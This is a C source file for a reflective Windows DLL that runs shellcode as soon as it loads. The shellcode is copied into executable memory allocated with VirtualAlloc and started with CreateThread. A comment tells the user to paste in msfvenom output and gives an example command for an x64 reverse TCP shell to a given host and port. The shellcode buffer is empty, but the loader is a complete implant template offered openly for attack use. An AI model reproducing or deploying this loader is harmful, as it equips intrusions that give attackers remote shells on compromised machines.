//===============================================================================================//
// Reflective DLL with shellcode execution x64
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <windows.h>
#include <stdlib.h>

extern HINSTANCE hAppInstance;

// Function to execute shellcode
void ExecuteShellcode() {
    // Replace this with your msfvenom shellcode
    // Example: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.38.1.123 LPORT=9091 EXITFUNC=thread -f c
    unsigned char shellcode[] = "";

    size_t shellcodeSize = sizeof(shellcode) - 1;

    // Allocate memory with execute permissions
    LPVOID shellcodeMemory = VirtualAlloc(
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (shellcodeMemory == NULL) {
        return;
    }

    // Copy shellcode to allocated memory
    memcpy(shellcodeMemory, shellcode, shellcodeSize);

    // Execute the shellcode
    // CreateThread method
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)shellcodeMemory,
        NULL,
        0,
        NULL
    );

    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    // alternative direct execution (if CreateThread doesn't work)
    // ((void(*)())shellcodeMemory)();
}

DWORD WINAPI ShellcodeThread(LPVOID lpParameter) {
    ExecuteShellcode();
    return 0;
}

//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    BOOL bReturnValue = TRUE;

    switch (dwReason) {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE*)lpReserved = hAppInstance;
        break;

    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;

        CreateThread(
            NULL,
            0,
            ShellcodeThread,
            NULL,
            0,
            NULL
        );
        break;

    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return bReturnValue;
}
